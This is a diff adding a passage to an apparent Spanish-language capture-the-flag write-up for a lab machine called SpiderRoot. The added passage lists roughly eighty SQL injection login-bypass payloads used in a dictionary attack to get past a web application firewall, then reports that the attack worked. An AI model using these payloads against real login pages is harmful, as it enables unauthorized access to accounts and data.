@@ -93,3 +93,99 @@ Así pues vamos a pasar la petición por burpsuite a ver que hay, vemos un comen
 ![Nmap Scan](images/SpiderRoot/8.png)
 
 
+De momento vamos a lanzar un ataque de diccionario con querys sql, para ver si podemos evadir el WAF, uso este minidiccionario:
+```
+'-'
+' '
+'&'
+'^'
+'*'
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+' or ''*'
+"-"
+" "
+"&"
+"^"
+"*"
+" or ""-"
+" or "" "
+" or ""&"
+" or ""^"
+" or ""*"
+or true--
+" or true--
+' or true--
+") or true--
+') or true--
+' or 'x'='x
+') or ('x')=('x
+')) or (('x'))=(('x
+" or "x"="x
+") or ("x")=("x
+")) or (("x"))=(("x
+or 1=1
+or 1=1--
+or 1=1#
+or 1=1/*
+admin' --
+admin' #
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin' or '1'='1'/*
+admin'or 1=1 or ''='
+admin' or 1=1
+admin' or 1=1--
+admin' or 1=1#
+admin' or 1=1/*
+admin') or ('1'='1
+admin') or ('1'='1'--
+admin') or ('1'='1'#
+admin') or ('1'='1'/*
+admin') or '1'='1
+admin') or '1'='1'--
+admin') or '1'='1'#
+admin') or '1'='1'/*
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+admin" --
+admin" #
+admin"/*
+admin" or "1"="1
+admin" or "1"="1"--
+admin" or "1"="1"#
+admin" or "1"="1"/*
+admin"or 1=1 or ""="
+admin" or 1=1
+admin" or 1=1--
+admin" or 1=1#
+admin" or 1=1/*
+admin") or ("1"="1
+admin") or ("1"="1"--
+admin") or ("1"="1"#
+admin") or ("1"="1"/*
+admin") or "1"="1
+admin") or "1"="1"--
+admin") or "1"="1"#
+admin") or "1"="1"/*
+1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+```
+
+![Nmap Scan](images/SpiderRoot/9.png)
+
+
+Pues vemos que ha funcionado, nos vamos a la página e introducimos la query:
+
+
+![Nmap Scan](images/SpiderRoot/10.png)
+
+
+
+![Nmap Scan](images/SpiderRoot/11.png)
+
+
+
+
